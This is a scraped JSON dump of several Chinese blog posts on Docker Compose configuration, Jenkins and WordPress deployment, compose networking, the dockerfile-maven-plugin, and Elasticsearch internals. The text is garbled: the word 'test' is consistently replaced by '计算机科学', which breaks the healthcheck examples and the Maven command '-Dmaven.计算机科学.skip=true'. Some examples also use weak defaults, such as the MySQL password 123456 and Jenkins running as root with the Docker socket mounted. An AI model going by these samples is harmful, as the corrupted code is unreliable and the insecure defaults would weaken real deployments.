# 暂停回滚 monitor # 每次回滚任务后的持续时间以监视失败(单位: ns|us|ms|s|m|h) (默认为0) max_failure_ratio  # 回滚期间容忍的失败率(默认值0) order  # 回滚期间的操作顺序 stop-first  # 旧任务在启动新任务之前停止(默认) start-first  # 首先启动新任务, 并且正在运行的任务暂时重叠 注意： 支持 docker-compose up 和 docker-compose run 但不支持 docker stack deploy 的子选项 security_opt container_name devices tmpfs stop_signal links cgroup_parent network_mode external_links restart build userns_mode sysctls devices  # 指定设备映射列表 (等同于 docker run --device 的作用) depends_on  # 定义容器启动顺序 (此选项解决了容器之间的依赖关系， 此选项在 v3 版本中 使用 swarm 部署时将忽略该选项) 示例： docker-compose up 以依赖顺序启动服务，下面例子中 redis 和 db 服务在 web 启动前启动 默认情况下使用 docker-compose up web 这样的方式启动 web 服务时，也会启动 redis 和 db 两个服务，因为在配置文件中定义了依赖关系 version: \u0026#39;3\u0026#39; services: web: build: . depends_on: - db  - redis  redis: image: redis db: image: postgres  dns  # 设置 DNS 地址(等同于 docker run --dns 的作用) dns_search  # 设置 DNS 搜索域(等同于 docker run --dns-search 的作用) tmpfs  # v2 版本以上, 挂载目录到容器中, 作为容器的临时文件系统(等同于 docker run --tmpfs 的作用, 在使用 swarm 部署时将忽略该选项) entrypoint  # 覆盖容器的默认 entrypoint 指令 (等同于 docker run --entrypoint 的作用) env_file  # 从指定文件中读取变量设置为容器中的环境变量, 可以是单个值或者一个文件列表, 如果多个文件中的变量重名则后面的变量覆盖前面的变量, environment 的值覆盖 env_file 的值 文件格式： RACK_ENV=development  environment  # 设置环境变量， environment 的值可以覆盖 env_file 的值 (等同于 docker run --env 的作用) expose  # 暴露端口, 但是不能和宿主机建立映射关系, 类似于 Dockerfile 的 EXPOSE 指令 external_links  # 连接不在 docker-compose.yml 中定义的容器或者不在 compose 管理的容器(docker run 启动的容器, 在 v3 版本中使用 swarm 部署时将忽略该选项) extra_hosts  # 添加 host 记录到容器中的 /etc/hosts 中 (等同于 docker run --add-host 的作用) healthcheck  # v2.1 以上版本, 定义容器健康状态检查, 类似于 Dockerfile 的 HEALTHCHECK 指令 计算机科学  # 检查容器检查状态的命令, 该选项必须是一个字符串或者列表, 第一项必须是 NONE, CMD 或 CMD-SHELL, 如果其是一个字符串则相当于 CMD-SHELL 加该字符串 NONE  # 禁用容器的健康状态检测 CMD # 计算机科学: [\u0026#34;CMD\u0026#34;, \u0026#34;curl\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;http://localhost\u0026#34;] CMD-SHELL # 计算机科学: [\u0026#34;CMD-SHELL\u0026#34;, \u0026#34;curl -f http://localhost || exit 1\u0026#34;] 或者　计算机科学: curl -f https://localhost || exit 1 interval: 1m30s  # 每次检查之间的间隔时间 timeout: 10s  # 运行命令的超时时间 retries: 3 # 重试次数 start_period: 40s  # v3.4 以上新增的选项, 定义容器启动时间间隔 disable: true # true 或 false, 表示是否禁用健康状态检测和　计算机科学: NONE 相同 image  # 指定 docker 镜像, 可以是远程仓库镜像、本地镜像 init  # v3.7 中新增的参数, true 或 false 表示是否在容器中运行一个 init, 它接收信号并传递给进程 isolation  # 隔离容器技术, 在 Linux 中仅支持 default 值 labels  # 使用 Docker 标签将元数据添加到容器, 与 Dockerfile 中的 LABELS 类似 links  # 链接到其它服务中的容器, 该选项是 docker 历史遗留的选项, 目前已被用户自定义网络名称空间取代, 最终有可能被废弃 (在使用 swarm 部署时将忽略该选项) logging  # 设置容器日志服务 driver  # 指定日志记录驱动程序, 默认 json-file (等同于 docker run --log-driver 的作用) options  # 指定日志的相关参数 (等同于 docker run --log-opt 的作用) max-size  # 设置单个日志文件的大小, 当到达这个值后会进行日志滚动操作 max-file  # 日志文件保留的数量 network_mode  # 指定网络模式 (等同于 docker run --net 的作用, 在使用 swarm 部署时将忽略该选项)  networks  # 将容器加入指定网络 (等同于 docker network connect 的作用), networks 可以位于 compose 文件顶级键和 services 键的二级键 aliases  # 同一网络上的容器可以使用服务名称或别名连接到其中一个服务的容器 ipv4_address  # IP V4 格式 ipv6_address  # IP V6 格式 示例: version: \u0026#39;3.7\u0026#39; services: test: image: nginx:1.14-alpine container_name: mynginx command: ifconfig networks: app_net: # 调用下面 networks 定义的 app_net 网络 ipv4_address: 172.16.238.10 networks: app_net: driver: bridge ipam: driver: default config: - subnet: 172.16.238.0/24 pid: \u0026#39;host\u0026#39; # 共享宿主机的 进程空间(PID) ports  # 建立宿主机和容器之间的端口映射关系, ports 支持两种语法格式 SHORT 语法格式示例: - \u0026#34;3000\u0026#34; # 暴露容器的 3000 端口, 宿主机的端口由 docker 随机映射一个没有被占用的端口 - \u0026#34;3000-3005\u0026#34; # 暴露容器的 3000 到 3005 端口, 宿主机的端口由 docker 随机映射没有被占用的端口 - \u0026#34;8000:8000\u0026#34; # 容器的 8000 端口和宿主机的 8000 端口建立映射关系 - \u0026#34;9090-9091:8080-8081\u0026#34; - \u0026#34;127.0.0.1:8001:8001\u0026#34; # 指定映射宿主机的指定地址的 - \u0026#34;127.0.0.1:5000-5010:5000-5010\u0026#34; - \u0026#34;6060:6060/udp\u0026#34; # 指定协议 LONG 语法格式示例:(v3.2 新增的语法格式) ports: - target: 80 # 容器端口 published: 8080 # 宿主机端口 protocol: tcp  # 协议类型 mode: host  # host 在每个节点上发布主机端口, ingress 对于群模式端口进行负载均衡 secrets  # 不知道怎么用 security_opt  # 为每个容器覆盖默认的标签 (在使用 swarm 部署时将忽略该选项) stop_grace_period  # 指定在发送了 SIGTERM 信号之后, 容器等待多少秒之后退出(默认 10s) stop_signal  # 指定停止容器发送的信号 (默认为 SIGTERM 相当于 kill PID; SIGKILL 相当于 kill -9 PID; 在使用 swarm 部署时将忽略该选项) sysctls  # 设置容器中的内核参数 (在使用 swarm 部署时将忽略该选项) ulimits  # 设置容器的 limit userns_mode  # 如果Docker守护程序配置了用户名称空间, 则禁用此服务的用户名称空间 (在使用 swarm 部署时将忽略该选项) volumes  # 定义容器和宿主机的卷映射关系, 其和 networks 一样可以位于 services 键的二级键和 compose 顶级键, 如果需要跨服务间使用则在顶级键定义, 在 services 中引用 SHORT 语法格式示例: volumes: - /var/lib/mysql  # 映射容器内的 /var/lib/mysql 到宿主机的一个随机目录中 - /opt/data:/var/lib/mysql  # 映射容器内的 /var/lib/mysql 到宿主机的 /opt/data - ./cache:/tmp/cache  # 映射容器内的 /var/lib/mysql 到宿主机 compose 文件所在的位置 - ~/configs:/etc/configs/:ro  # 映射容器宿主机的目录到容器中去, 权限只读 - datavolume:/var/lib/mysql  # datavolume 为 volumes 顶级键定义的目录, 在此处直接调用 LONG 语法格式示例:(v3.2 新增的语法格式) version: \u0026#34;3.2\u0026#34; services: web: image: nginx:alpine ports: - \u0026#34;80:80\u0026#34; volumes: - type: volume  # mount 的类型, 必须是 bind、volume 或 tmpfs source: mydata  # 宿主机目录 target: /data  # 容器目录 volume: # 配置额外的选项, 其 key 必须和 type 的值相同 nocopy: true # volume 额外的选项, 在创建卷时禁用从容器复制数据 - type: bind  # volume 模式只指定容器路径即可, 宿主机路径随机生成; bind 需要指定容器和数据机的映射路径 source: ./static target: /opt/app/static read_only: true # 设置文件系统为只读文件系统 volumes: mydata: # 定义在 volume, 可在所有服务中调用 restart  # 定义容器重启策略(在使用 swarm 部署时将忽略该选项, 在 swarm 使用 restart_policy 代替 restart) no # 禁止自动重启容器(默认) always  # 无论如何容器都会重启 on-failure  # 当出现 on-failure 报错时, 容器重新启动 其他选项： domainname, hostname, ipc, mac_address, privileged, read_only, shm_size, stdin_open, tty, user, working_dir 上面这些选项都只接受单个值和 docker run 的对应参数类似 对于值为时间的可接受的值： 2.5s 10s 1m30s 2h32m 5h34m56s 时间单位: us, ms, s, m， h 对于值为大小的可接受的值： 2b 1024kb 2048k 300m 1gb 单位: b, k, m, g 或者 kb, mb, gb networks  # 定义 networks 信息 driver  # 指定网络模式, 大多数情况下, 它 bridge 于单个主机和 overlay Swarm 上 bridge  # Docker 默认使用 bridge 连接单个主机上的网络 overlay  # overlay 驱动程序创建一个跨多个节点命名的网络 host  # 共享主机网络名称空间(等同于 docker run --net=host) none  # 等同于 docker run --net=none driver_opts  # v3.2以上版本, 传递给驱动程序的参数, 这些参数取决于驱动程序 attachable  # driver 为 overlay 时使用, 如果设置为 true 则除了服务之外，独立容器也可以附加到该网络; 如果独立容器连接到该网络，则它可以与其他 Docker 守护进程连接到的该网络的服务和独立容器进行通信 ipam  # 自定义 IPAM 配置. 这是一个具有多个属性的对象, 每个属性都是可选的 driver  # IPAM 驱动程序, bridge 或者 default config  # 配置项 subnet  # CIDR格式的子网，表示该网络的网段 external  # 外部网络, 如果设置为 true 则 docker-compose up 不会尝试创建它, 如果它不存在则引发错误 name  # v3.5 以上版本, 为此网络设置名称 文件格式示例： version: \u0026#34;3\u0026#34; services: redis: image: redis:alpine ports: - \u0026#34;6379\u0026#34; networks: - frontend deploy: replicas: 2 update_config: parallelism: 2 delay: 10s restart_policy: condition: on-failure db: image: postgres:9.4 volumes: - db-data:/var/lib/postgresql/data networks: - backend deploy: placement: constraints: [node.role == manager] ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/docker-compose.yml%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/","series":["Manual"],"tags":["Other"],"title":"docker-compose.yml文件详解"},{"categories":["持续集成部署"],"content":"docker-compose的方式启动jenkins\njenkins官网提供了多种安装方式，唯独没有提供docker compose的教程！咱也不知道为啥，所以自己动手丰衣足食。\n1. 编写docker-compose.yml version: \u0026#39;3\u0026#39; services: jenkins: image: jenkinsci/blueocean container_name: jenkins user: root ports: - \u0026#39;8080:8080\u0026#39; - \u0026#39;50000:50000\u0026#39; volumes: - \u0026#39;/docker/volumes/jenkins:/var/jenkins_home\u0026#39; - \u0026#39;/var/run/docker.sock:/var/run/docker.sock\u0026#39; - \u0026#39;/usr/local/jdk1.8.0_241:/usr/local/jdk1.8.0_241\u0026#39; - \u0026#39;/usr/local/apache-maven-3.6.3:/usr/local/apache-maven-3.6.3\u0026#39; restart: always 2. 启动jenkins docker-compose up -d jenkins \u0026amp;\u0026amp; docker logs -f jenkins ==jenkins 启动时，一直处在 Please wait while Jenkins is getting ready to work \u0026hellip;== 需要更新hudson.model.UpdateCenter.xml的url：\n\u0026lt;?xml version=\u0026#39;1.1\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt; \u0026lt;sites\u0026gt; \u0026lt;site\u0026gt; \u0026lt;id\u0026gt;default\u0026lt;/id\u0026gt; \u0026lt;url\u0026gt;https://updates.jenkins.io/update-center.json\u0026lt;/url\u0026gt; \u0026lt;/site\u0026gt; \u0026lt;/sites\u0026gt; 更新为：\n\u0026lt;?xml version=\u0026#39;1.1\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt; \u0026lt;sites\u0026gt; \u0026lt;site\u0026gt; \u0026lt;id\u0026gt;default\u0026lt;/id\u0026gt; \u0026lt;url\u0026gt;http://mirror.xmission.com/jenkins/updates/update-center.json\u0026lt;/url\u0026gt; \u0026lt;/site\u0026gt; \u0026lt;/sites\u0026gt; ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cicd/docker-compose%E7%9A%84%E6%96%B9%E5%BC%8F%E5%90%AF%E5%8A%A8jenkins/","series":null,"tags":["Jenkins","docker-compose"],"title":"docker-compose的方式启动jenkins"},{"categories":["其他"],"content":"docker-compose的方式部署wordpress\n 安装docker  sudo yum install -y yum-utils device-mapper-persistent-data lvm2 sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo sudo yum install docker-ce docker-ce-cli containerd.io  编写docker-compose.yml  mysql: image: mysql:5.7 environment: - MYSQL_ROOT_PASSWORD=123456 - MYSQL_DATABASE=wordpress web: image: wordpress links: - mysql environment: - WORDPRESS_DB_PASSWORD=123456 ports: - \u0026#34;0.0.0.0:8080:80\u0026#34; working_dir: /var/www/html volumes: - wordpress:/var/www/html  启动docker  sudo systemctl start docker  运行docker-compose  docker-compose up 参考：\nWhat does \u0026ldquo;local address\u0026rdquo; and \u0026ldquo;foreign address\u0026rdquo; mean in the netstat command result? Docker 入门教程 Docker 微服务教程 Wordpress 容器化、HTTPS化全攻略 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/wordpress/docker-compose%E7%9A%84%E6%96%B9%E5%BC%8F%E9%83%A8%E7%BD%B2wordpress/","series":["Manual"],"tags":["WordPress"],"title":"docker-compose的方式部署wordpress"},{"categories":["其他"],"content":"基本概念 默认情况下，Compose 会为我们的应用创建一个网络，服务的每个容器都会加入该网络中。这样，容器就可被该网络中的其他容器访问，不仅如此，该容器还能以服务名称作为 hostname 被其他容器访问。\n默认情况下，应用程序的网络名称基于 Compose 的工程名称，而项目名称基于 docker-compose.yml 所在目录的名称。如需修改工程名称，可使用\u0026ndash;project-name 标识或 COMPOSE_PORJECT_NAME 环境变量。\n举个例子，假如一个应用程序在名为 myapp 的目录中，并且 docker-compose.yml 如下所示：\nversion: \u0026#39;2\u0026#39; services: web: build: . ports: - \u0026#34;8000:8000\u0026#34; db: image: postgres 当我们运行 docker-compose up 时，将会执行以下几步：\n 创建一个名为 myapp_default 的网络； 使用 web 服务的配置创建容器，它以“web”这个名称加入网络 myapp_default； 使用 db 服务的配置创建容器，它以“db”这个名称加入网络 myapp_default。  容器间可使用服务名称（web 或 db）作为 hostname 相互访问。例如，web 这个服务可使用postgres://db:5432 访问 db 容器。\n更新容器 当服务的配置发生更改时，可使用 docker-compose up 命令更新配置。\n此时，Compose 会删除旧容器并创建新容器。新容器会以不同的 IP 地址加入网络，名称保持不变。任何指向旧容器的连接都会被关闭，容器会重新找到新容器并连接上去。\nlinks 前文讲过，默认情况下，服务之间可使用服务名称相互访问。links 允许我们定义一个别名，从而使用该别名访问其他服务。举个例子：\nversion: \u0026#39;2\u0026#39; services: web: build: . links: - \u0026#34;db:database\u0026#34; db: image: postgres 这样 web 服务就可使用 db 或 database 作为 hostname 访问 db 服务了。\n指定自定义网络 一些场景下，默认的网络配置满足不了我们的需求，此时我们可使用 networks 命令自定义网络。networks 命令允许我们创建更加复杂的网络拓扑并指定自定义网络驱动和选项。不仅如此，我们还可使用 networks 将服务连接到不是由 Compose 管理的、外部创建的网络。\n如下，我们在其中定义了两个自定义网络。\nversion: \u0026#39;2\u0026#39; services: proxy: build: ./proxy networks: - front app: build: ./app networks: - front - back db: image: postgres networks: - back networks: front: # Use a custom driver driver: custom-driver-1 back: # Use a custom driver which takes special options driver: custom-driver-2 driver_opts: foo: \u0026#34;1\u0026#34; bar: \u0026#34;2\u0026#34; 其中，proxy 服务与 db 服务隔离，两者分别使用自己的网络；app 服务可与两者通信。\n由本例不难发现，使用 networks 命令，即可方便实现服务间的网络隔离与连接。\n配置默认网络 除自定义网络外，我们也可为默认网络自定义配置。\nversion: \u0026#39;2\u0026#39; services: web: build: . ports: - \u0026#34;8000:8000\u0026#34; db: image: postgres networks: default: # Use a custom driver driver: custom-driver-1 这样，就可为该应用指定自定义的网络驱动。\n使用已存在的网络 一些场景下，我们并不需要创建新的网络，而只需加入已存在的网络，此时可使用 external 选项。示例：\nnetworks: default: external: name: my-pre-existing-network Docker Compose 链接外部容器的几种方式 在 Docker 中，容器之间的链接是一种很常见的操作：它提供了访问其中的某个容器的网络服务而不需要将所需的端口暴露给 Docker Host 主机的功能。Docker Compose 中对该特性的支持同样是很方便的。然而，如果需要链接的容器没有定义在同一个docker-compose.yml中的时候，这个时候就稍微麻烦复杂了点。\n在不使用 Docker Compose 的时候，将两个容器链接起来使用—link参数，相对来说比较简单，以nginx镜像为例子：\ndocker run --rm --name test1 -d nginx #开启一个实例test1 docker run --rm --name test2 --link test1 -d nginx #开启一个实例test2并与test1建立链接 这样，test2与test1便建立了链接，就可以在test2中使用访问test1中的服务了。\n如果使用 Docker Compose，那么这个事情就更简单了，还是以上面的nginx镜像为例子，编辑docker-compose.yml文件为：\nversion: \u0026#34;3\u0026#34; services: test2: image: nginx depends_on: - test1 links: - test1 test1: image: nginx 最终效果与使用普通的 Docker 命令docker run xxxx建立的链接并无区别。这只是一种最为理想的情况。\n 如果容器没有定义在同一个docker-compose.yml文件中，应该如何链接它们呢？ 又如果定义在docker-compose.yml文件中的容器需要与docker run xxx启动的容器链接，需要如何处理？  针对这两种典型的情况，下面给出我个人测试可行的办法：\n方式一：让需要链接的容器同属一个外部网络 我们还是使用 nginx 镜像来模拟这样的一个情景：假设我们需要将两个使用 Docker Compose 管理的 nignx 容器（test1和test2）链接起来，使得test2能够访问test1中提供的服务，这里我们以能 ping 通为准。\n首先，我们定义容器test1的docker-compose.yml文件内容为：\nversion: \u0026#34;3\u0026#34; services: test2: image: nginx container_name: test1 networks: - default - app_net networks: app_net: external: true 容器test2内容与test1基本一样，只是多了一个external_links,需要特别说明的是：最近发布的 Docker 版本已经不需要使用 external_links 来链接容器，容器的 DNS 服务可以正确的作出判断，因此如果你你需要兼容较老版本的 Docker 的话，那么容器test2的docker-compose.yml文件内容为：\nversion: \u0026#34;3\u0026#34; services: test2: image: nginx networks: - default - app_net external_links: - test1 container_name: test2 networks: app_net: external: true 否则的话，test2的docker-compose.yml和test1的定义完全一致，不需要额外多指定一个external_links。相关的问题请参见 stackoverflow 上的相关问题：docker-compose + external container 正如你看到的那样，这里两个容器的定义里都使用了同一个外部网络app_net,因此，我们需要在启动这两个容器之前通过以下命令再创建外部网络：\ndocker network create app_net复制代码\n之后，通过docker-compose up -d命令启动这两个容器，然后执行docker exec -it test2 ping test1,你将会看到如下的输出：\ndocker exec -it test2 ping test1 PING test1 (172.18.0.2): 56 data bytes 64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.091 ms 64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.146 ms 64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.150 ms 64 bytes from 172.18.0.2: icmp_seq=3 ttl=64 time=0.145 ms 64 bytes from 172.18.0.2: icmp_seq=4 ttl=64 time=0.126 ms 64 bytes from 172.18.0.2: icmp_seq=5 ttl=64 time=0.147 ms 证明这两个容器是成功链接了，反过来在test1中 pingtest2也是能够正常 ping 通的。\n如果我们通过docker run --rm --name test3 -d nginx这种方式来先启动了一个容器(test3)并且没有指定它所属的外部网络，而需要将其与test1或者test2链接的话，这个时候手动链接外部网络即可：\ndocker network connect app_net test3这样，三个容器都可以相互访问了。 方式二：更改需要链接的容器的网络模式 通过更改你想要相互链接的容器的网络模式为bridge,并指定需要链接的外部容器（external_links)即可。与同属外部网络的容器可以相互访问的链接方式一不同，这种方式的访问是单向的。\n还是以 nginx 容器镜像为例子，如果容器实例nginx1需要访问容器实例nginx2，那么nginx2的doker-compose.yml定义为：\nversion: \u0026#34;3\u0026#34; services: nginx2: image: nginx container_name: nginx2 network_mode: bridge 与其对应的，nginx1的docker-compose.yml定义为：\nversion: \u0026#34;3\u0026#34; services: nginx1: image: nginx external_links: - nginx2 container_name: nginx1 network_mode: bridge  需要特别说明的是，这里的external_links是不能省略的，而且nginx1的启动必须要在nginx2之后，否则可能会报找不到容器nginx2的错误。\n 接着我们使用 ping 来测试下连通性：\n$ docker exec -it nginx1 ping nginx2 # nginx1 to nginx2 PING nginx2 (172.17.0.4): 56 data bytes 64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.141 ms 64 bytes from 172.17.0.4: icmp_seq=1 ttl=64 time=0.139 ms 64 bytes from 172.17.0.4: icmp_seq=2 ttl=64 time=0.145 ms $ docker exec -it nginx2 ping nginx1 #nginx2 to nginx1 ping: unknown host 以上也能充分证明这种方式是属于单向联通的。\n在实际应用中根据自己的需要灵活的选择这两种链接方式，如果想偷懒的话，大可选择第二种。不过我更推荐第一种，不难看出无论是联通性还是灵活性，较为更改网络模式的第二种都更为友好。\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/docker-compose%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/","series":["Manual"],"tags":["Other"],"title":"docker-compose网络设置"},{"categories":["编程思想"],"content":"\u0026lt;properties\u0026gt; \u0026lt;docker.image.prefix\u0026gt;anaham-docker.pkg.coding.net/cereshop/ceres\u0026lt;/docker.image.prefix\u0026gt; \u0026lt;anaham-docker.username\u0026gt;用户名\u0026lt;/anaham-docker.username\u0026gt; \u0026lt;anaham-docker.password\u0026gt;密码\u0026lt;/anaham-docker.password\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;executions\u0026gt; \u0026lt;execution\u0026gt; \u0026lt;goals\u0026gt; \u0026lt;goal\u0026gt;repackage\u0026lt;/goal\u0026gt; \u0026lt;/goals\u0026gt; \u0026lt;/execution\u0026gt; \u0026lt;/executions\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;!-- docker打包插件 --\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;com.spotify\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;dockerfile-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${dockerfile-maven-plugin.version}\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;username\u0026gt;${anaham-docker.username}\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;${anaham-docker.password}\u0026lt;/password\u0026gt; \u0026lt;repository\u0026gt;${docker.image.prefix}/${project.artifactId}\u0026lt;/repository\u0026gt; \u0026lt;tag\u0026gt;${ceres.version}\u0026lt;/tag\u0026gt; \u0026lt;!-- 不指定tag默认为latest --\u0026gt; \u0026lt;buildArgs\u0026gt; \u0026lt;JAR_FILE\u0026gt;target/${project.build.finalName}.jar\u0026lt;/JAR_FILE\u0026gt; \u0026lt;/buildArgs\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt;  构建镜像  mvn clean package -Dmaven.计算机科学.skip=true dockerfile:build -Ddockerfile.tag=latest 因为上面pom.xml已经指定了tag，也可以直接使用：mvn dockerfile:build 会优先选择pom.xml配置的tag\n上传镜像  mvn dockerfile:push -Ddockerfile.username=[镜像仓库账号] -Ddockerfile.password=[镜像仓库密码] 因为上面pom.xml已经指定了username和password，也可以直接使用：mvn dockerfile:push\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/maven/dockerfile-maven-plugin%E4%BD%BF%E7%94%A8/","series":["Manual"],"tags":["Maven"],"title":"dockerfile-maven-plugin使用"},{"categories":["编程思想"],"content":"1. ES 的分布式架构原理 ElasticSearch 设计的理念就是分布式搜索引擎，底层其实还是基于 lucene 的。核心思想就是在多台机器上启动多个 ES 进程实例，组成了一个 ES 集群。\n默认节点会去加入一个名称为 elasticsearch 的集群。如果直接启动一堆节点，那么它们会自动组成一个 elasticsearch 集群，当然一个节点也可以组成 elasticsearch 集群。\n1.1 ES数据结构 ES 中存储数据的基本单位是索引，比如说你现在要在 ES 中存储一些订单数据，你就应该在 ES 中创建一个索引 order_idx ，所有的订单数据就都写到这个索引里面去，一个索引差不多就是相当于是 mysql 里的一张表。\nindex -\u0026gt; type -\u0026gt; mapping -\u0026gt; document -\u0026gt; field。 1.2 ES高可用 类似kafka将一个topic分成多个partition，es将一个index分成多个shard。\n 每个 shard 存储部分数据。拆分多个 shard 是有好处的，一是支持横向扩展，比如你数据量是 3T，3 个 shard，每个 shard 就 1T 的数据，若现在数据量增加到 4T，怎么扩展，很简单，重新建一个有 4 个 shard 的索引，将数据导进去；二是提高性能，数据分布在多个 shard，即多台服务器上，所有的操作，都会在多台机器上并行分布式执行，提高了吞吐量和性能。\n kafka的每个partition有多个replica副本，所有副本选出一个leader（依赖zookeeper完成选举）负责所有的读写请求。\nES 的每个shard也可以配置多个replica副本，每个 shard 都有一个 primary shard ，负责写入数据，但是还有几个 replica shard 。 primary shard 写入数据之后，会将数据同步到其他几个 replica shard 上去。\n primary shard（建立索引时一次设置，不能修改，默认 5 个），replica shard（随时修改数量，默认 1 个），默认每个索引 10 个 shard，5 个 primary shard，5 个 replica shard，最小的高可用配置，是 2 台服务器。\n 与kafka partition副本不同的是，es不仅 primary shard 能读写，replica shard 也能读。\nES 集群多个节点，会自动选举一个节点为 master 节点，这个 master 节点其实就是干一些管理的工作的，比如维护索引元数据、负责切换 primary shard 和 replica shard 身份等。要是 master 节点宕机了，那么会重新选举一个节点为 master 节点。\n与kafka依赖zookeeper完成 选举主节点服务器(controller)、 选举partition leader方式不同的是，es依赖自己的实现（ZenDiscovery）完成集群master 节点选举、primary shard切换 不依赖第三方组件。\n 一致性算法研究(三)Kafka 但是，中间过程中的机器宕机等情况时，怎么来保证一致性呢？ 这个问题，kafka交给了zookeeper来解决。kafka集群启动时，会依靠zookeeper来选举一个集群的主节点服务器(controller)，controller来管理整个集群，比如队列的创建、删除，队列分区的选主，如前边所说的，topicA有3个分区，每个分区有3个副本(replica)，在创建每个分区时，kafka会使用zookeeper来选举一个分区副本的主(leader)。\n一个集群内有上千个队列，每个队列都有数十个甚至数百个分区，每个分区又会有若干个副本，多个副本之间谁是leader副本？这些信息称之为metadata，kafka全部储存在了zookeeper上。\n所以机器宕机时，controller和leader replica的选举任务都交给了zookeeper来完成，那么这时集群内机器之间的一致性，分区副本之间的一致性，这些共识问题都交给了zookeeper来解决。有了zookeeper，集群内每个机器不会对谁是controller再产生分歧，有了controller，一个集群就一个统一的“负责人”。同时，每个分区的副本之间使用zookeeper来选主，也会产生一个“负责人”，所有机器，多个副本之间都交由这些负责人来协调，不会再产生分歧，而且不会脑裂。\n  Elasticsearch分布式一致性原理剖析(一)-节点篇 那为什么ES不使用Zookeeper呢，大概是官方开发觉得增加Zookeeper依赖后会多依赖一个组件，使集群部署变得更复杂，用户在运维时需要多运维一个Zookeeper。\n那么在自主实现这条路上，还有什么别的算法选择吗？当然有的，比如raft\nraft从正确性上看肯定是更好的选择，而ES的选举算法经过几次bug fix也越来越像raft。当然，在ES最早开发时还没有raft（es的前身compass于2004开源，2010进行重构并改名为es，raft算法2012才发表😔），而未来ES如果继续沿着这个方向走很可能最终就变成一个raft实现。\n 2. ES 的工作原理 2.1 底层 lucene 简单来说，lucene 就是一个 jar 包，里面包含了封装好的各种建立倒排索引的算法代码。我们用 Java 开发的时候，引入 lucene jar，然后基于 lucene 的 api 去开发就可以了。\n通过 lucene，我们可以将已有的数据建立索引，lucene 会在本地磁盘上面，给我们组织索引的数据结构。\n2.2 倒排索引 在搜索引擎中，每个文档都有一个对应的文档 ID，文档内容被表示为一系列关键词的集合。例如，文档 1 经过分词，提取了 20 个关键词，每个关键词都会记录它在文档中出现的次数和出现位置。\n那么，倒排索引就是关键词到文档 ID 的映射，每个关键词都对应着一系列的文件，这些文件中都出现了关键词。\n举个栗子。\n有以下文档：\n   DocId Doc     1 谷歌地图之父跳槽 Facebook   2 谷歌地图之父加盟 Facebook   3 谷歌地图创始人拉斯离开谷歌加盟 Facebook   4 谷歌地图之父跳槽 Facebook 与 Wave 项目取消有关   5 谷歌地图之父拉斯加盟社交网站 Facebook    对文档进行分词之后，得到以下倒排索引。\n   WordId Word DocIds     1 谷歌 1, 2, 3, 4, 5   2 地图 1, 2, 3, 4, 5   3 之父 1, 2, 4, 5   4 跳槽 1, 4   5 Facebook 1, 2, 3, 4, 5   6 加盟 2, 3, 5   7 创始人 3   8 拉斯 3, 5   9 离开 3   10 与 4   .. .. ..    另外，实用的倒排索引还可以记录更多的信息，比如文档频率信息，表示在文档集合中有多少个文档包含某个单词。\n那么，有了倒排索引，搜索引擎可以很方便地响应用户的查询。比如用户输入查询 Facebook ，搜索系统查找倒排索引，从中读出包含这个单词的文档，这些文档就是提供给用户的搜索结果。\n要注意倒排索引的两个重要细节：\n 倒排索引中的所有词项对应一个或多个文档； 倒排索引中的词项根据字典顺序升序排列   上面只是一个简单的栗子，并没有严格按照字典顺序升序排列。\n 3.ES 读写检索数据的过程 3.1 ES 写数据过程  客户端选择一个 node 发送请求过去，这个 node 就是 coordinating node （协调节点）。 coordinating node 对 document 进行路由，将请求转发给对应的 node（有 primary shard）。 实际的 node 上的 primary shard 处理请求，然后将数据同步到 replica node 。 coordinating node 如果发现 primary node 和所有 replica node 都搞定之后，就返回响应结果给客户端。  3.2 ES 读数据过程 GET my-index/_doc/0  Client 将请求发送到任意节点 node，此时 node 节点就是协调节点（coordinating node）。 协调节点对 id 进行路由，从而判断该数据在哪个 shard。 在 primary shard 和 replica shard 之间 随机选择一个，请求获取 doc。 接收请求的节点会将数据返回给协调节点，协调节点会将数据返回给 Client。   可以通过 preference 参数指定执行操作的节点或分片。默认为随机。\n 3.3 ES 检索数据过程 GET /my-index/_search es 最强大的是做全文检索，就是比如你有三条数据：\njava真好玩儿啊 java好难学啊 j2ee特别牛 你根据 java 关键词来搜索，将包含 java 的 document 给搜索出来。es 就会给你返回：java 真好玩儿啊，java 好难学啊。\n 客户端发送请求到一个 coordinate node 。 协调节点将搜索请求转发到所有的 shard 对应的 primary shard 或 replica shard ，都可以。 query phase：每个 shard 将自己的搜索结果（其实就是一些 doc id 